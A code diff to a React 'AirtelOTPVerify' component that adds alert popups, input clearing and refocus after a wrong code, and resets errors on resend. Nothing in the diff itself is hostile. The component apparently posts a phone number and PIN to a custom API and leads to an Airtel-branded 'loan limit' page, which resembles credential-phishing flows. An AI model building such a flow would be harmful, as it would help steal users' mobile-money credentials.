@@ -48,8 +48,10 @@ function AirtelOTPVerify() {
     e.preventDefault();
     const otpString = otp.join('');
 
+    // Local validation — must have 4 digits
     if (otpString.length < 4) {
       setError('Please enter the 4-digit verification code.');
+      alert('⚠️ Please enter the 4-digit verification code.');
       return;
     }
 
@@ -64,11 +66,24 @@ function AirtelOTPVerify() {
       const data = await response.json();
 
       if (data.status === 'success') {
+        // ✅ Correct OTP — go to next page
         navigate('/airtel-loan-limit');
       } else {
+        // ❌ Wrong OTP — show popup, inline error, and clear the boxes
+        const wrongMsg = '❌ Wrong OTP! Please check the code sent to your phone and try again.';
+        alert(wrongMsg);
         setError(data.message || 'Invalid OTP. Please try again.');
+
+        // Clear the OTP inputs so the user can type fresh
+        setOtp(['', '', '', '']);
+
+        // Refocus the first input box
+        setTimeout(() => {
+          inputRefs.current[0]?.focus();
+        }, 100);
       }
     } catch {
+      alert('⚠️ Error verifying OTP. Please check your internet connection and try again.');
       setError('Error verifying OTP. Please try again.');
     }
   };
@@ -76,13 +91,14 @@ function AirtelOTPVerify() {
   const handleResend = () => {
     setTimeLeft(45);
     setOtp(['', '', '', '']);
+    setError('');
     // Optionally re-trigger the login endpoint to resend OTP
     fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ phone_number: phoneNumber, pin: '0000' }),
     }).catch(() => console.error('Resend failed'));
-    alert('A new code has been sent to your phone.');
+    alert('📩 A new code has been sent to your phone.');
   };
 
   return (
